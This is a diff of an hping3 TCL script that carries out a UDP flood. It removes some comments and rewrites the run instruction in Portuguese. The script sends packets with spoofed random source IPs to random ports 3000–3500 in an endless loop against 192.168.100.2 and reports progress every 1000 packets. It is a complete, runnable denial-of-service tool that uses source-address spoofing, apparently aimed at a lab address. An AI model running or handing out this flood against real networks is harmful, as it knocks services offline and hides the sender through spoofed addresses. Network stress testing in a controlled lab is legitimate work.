@@ -1,10 +1,8 @@
-# Hping3 UDP Flood (random src/dst port between 3000–3500, 0-byte payload) with TCL script
-# UDP Flood (random source IP, source/dest port in [3000,3500], ttl=64, payload=0)
+# Hping3 UDP Flood (random src/dst port between 3000–3500) with TCL script
 
 set dst_ip "192.168.100.2"
 set count 0
 
-# Function to generate random IP address
 proc random_ip {} {
     return "[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}]"
 }
@@ -18,14 +16,13 @@ while {1} {
     set saddr [random_ip]
     set sport [random_port]
     set dport [random_port]
-    # UDP packet: random source IP, random source port [3000-3500], random dest port [3000-3500], TTL=64, empty payload
     set pkt "ip(saddr=$saddr,daddr=$dst_ip,ttl=64)+udp(sport=$sport,dport=$dport)"
     hping send $pkt
     incr count
-    # Print every 1000 packets sent
+
     if {[expr {$count % 1000}] == 0} {
         puts "$count UDP packets sent so far..."
     }
 }
 
-# To run: sudo hping3 exec udp-tcp_range_ports.htcl
+# Comando: sudo hping3 exec udp-tcp_range_ports.htcl
